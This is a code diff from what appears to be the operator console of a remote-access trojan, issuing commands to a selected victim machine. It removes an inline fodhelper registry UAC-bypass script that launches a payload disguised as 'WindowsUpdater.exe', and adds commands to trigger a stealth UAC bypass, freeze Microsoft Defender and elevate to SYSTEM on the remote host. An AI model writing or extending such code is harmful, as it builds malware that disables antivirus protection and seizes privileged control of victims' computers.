@@ -177,13 +177,18 @@ class Controller
             case "/exit": Environment.Exit(0); break;
             case "/uacbypass":
                 if (string.IsNullOrEmpty(selectedMachine)) return;
-                string uacBypassScript = "reg add \"HKCU\\Software\\Classes\\ms-settings\\shell\\open\\command\" /v \"DelegateExecute\" /f; " +
-                                         "reg add \"HKCU\\Software\\Classes\\ms-settings\\shell\\open\\command\" /d \"$env:APPDATA\\WindowsUpdater.exe\" /f; " +
-                                         "start-process \"C:\\Windows\\System32\\fodhelper.exe\" -WindowStyle Hidden; " +
-                                         "Start-Sleep -Seconds 2; " +
-                                         "reg delete \"HKCU\\Software\\Classes\\ms-settings\" /f";
-                await SendEncoded(uacBypassScript, c);
-                Console.WriteLine("UAC Bypass command sent. Note: This attempts to gain elevated privileges. Use responsibly.");
+                await Send("/uac-internal-trigger", c);
+                Console.WriteLine("Sent stealth UAC Bypass trigger.");
+                break;
+            case "/freeze":
+                if (string.IsNullOrEmpty(selectedMachine)) return;
+                await Send("/freeze-av", c);
+                Console.WriteLine("Sent Defender Freeze trigger (UnDefend method).");
+                break;
+            case "/getsystem":
+                if (string.IsNullOrEmpty(selectedMachine)) return;
+                await Send("/getsystem", c);
+                Console.WriteLine("Sent SYSTEM Elevation trigger (RedSun method).");
                 break;
         }
     }
